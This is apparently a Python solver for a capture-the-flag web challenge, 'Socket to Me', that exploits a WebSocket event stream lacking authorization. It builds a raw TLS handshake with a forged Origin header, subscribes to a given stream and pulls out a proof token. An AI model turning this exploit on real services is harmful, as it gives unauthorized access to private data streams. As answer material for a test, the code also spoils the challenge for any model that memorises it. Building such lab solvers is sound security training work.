"""D27 "Socket to Me" (web-exploitation-day-22-socket-to-me): WebSocket event stream without authorization.

Kit shape: /api/clues = {framework, feature_route, current_role, stream_reference:<int>}; a plain GET of
feature_route -> 426 {"error":"websocket_upgrade_required"}. An HTTP/1.1 upgrade WITHOUT Origin -> 403; with any
Origin (own host or foreign, measured Single) -> 101 and the server pushes the first text frame
{"ok":true,"effect":"unauthorized_event_stream","evidence":"proof_..."} for ?stream=<stream_reference>.
Stdlib client (no websocket lib in the venv): raw TLS socket, handshake, read frames, PROOF_RE.
"""
import base64
import json
import os
import re
import socket
import ssl
import struct
import time
import urllib.parse

from lib import websolve


def _ws(url, origin, send=(), timeout=6):
    u = urllib.parse.urlsplit(url)
    tls = u.scheme in ("https", "wss")
    host, port = u.hostname, u.port or (443 if tls else 80)
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        if tls:
            s = ssl.create_default_context().wrap_socket(s, server_hostname=host)
        path = (u.path or "/") + ("?" + u.query if u.query else "")
        key = base64.b64encode(os.urandom(16)).decode()
        req = (f"GET {path} HTTP/1.1\r\nHost: {u.netloc}\r\nUser-Agent: {websolve.UA}\r\nUpgrade: websocket\r\n"
               f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
               f"Origin: {origin}\r\n\r\n")
        s.sendall(req.encode())
        buf, end = b"", time.time() + timeout
        while b"\r\n\r\n" not in buf and time.time() < end:
            d = s.recv(4096)
            if not d:
                break
            buf += d
        head, _, buf = buf.partition(b"\r\n\r\n")
        out = head.decode(errors="replace")
        if " 101 " not in out.split("\r\n", 1)[0]:
            return out + buf.decode(errors="replace")
        for m in send:
            p, mk = m.encode(), os.urandom(4)
            n = len(p)
            h = bytes([0x81]) + (bytes([0x80 | n]) if n < 126 else bytes([0xFE]) + struct.pack(">H", n))
            s.sendall(h + mk + bytes(b ^ mk[i % 4] for i, b in enumerate(p)))
        s.settimeout(2)
        while time.time() < end:
            try:
                d = s.recv(4096)
            except (socket.timeout, OSError):
                break
            if not d:
                break
            buf += d
            out_all = out + buf.decode(errors="replace")
            if websolve.PROOF_RE.search(out_all):
                return out_all
        return out + buf.decode(errors="replace")
    finally:
        try:
            s.close()
        except OSError:
            pass


def socket_stream(base, clues):
    cl = clues if isinstance(clues, dict) else {}
    route = next((v for k, v in cl.items() if re.search(r"feature|dispatch|socket|ws|route", k, re.I)
                  and isinstance(v, str) and re.fullmatch(r"/[\w./-]+", v)), None)
    ref = next((v for k, v in cl.items() if re.search(r"stream|channel|topic|room", k, re.I)
                and isinstance(v, (int, str)) and not isinstance(v, bool)), None)
    if not route:
        return None
    url = urllib.parse.urljoin(base, route)
    st, body, _ = websolve.fetch(url)
    p = websolve.proof(body)
    if p:
        return p
    if st != 426 and not re.search(r"websocket|upgrade", body or "", re.I):
        return None   # not a websocket route
    o = urllib.parse.urlsplit(base)
    origin = f"{o.scheme}://{o.netloc}"
    q = urllib.parse.urlencode({"stream": ref}) if ref is not None else ""
    attempts = []
    if ref is not None:
        attempts.append((url + ("&" if "?" in url else "?") + q, ()))
        attempts.append((url, (json.dumps({"stream": ref}), json.dumps({"subscribe": ref}))))
    else:
        attempts.append((url, ()))
    for u, send in attempts:
        try:
            out = _ws(u, origin, send)
        except (OSError, ssl.SSLError, ValueError):
            continue
        p = websolve.proof(out)
        if p:
            return p
    return None


KEY_MAP = [(r"stream_reference|stream_id|event_stream|socket_route|ws_route", "day27_web_socket_to_me")]
HANDLERS = {"day27_web_socket_to_me": socket_stream}
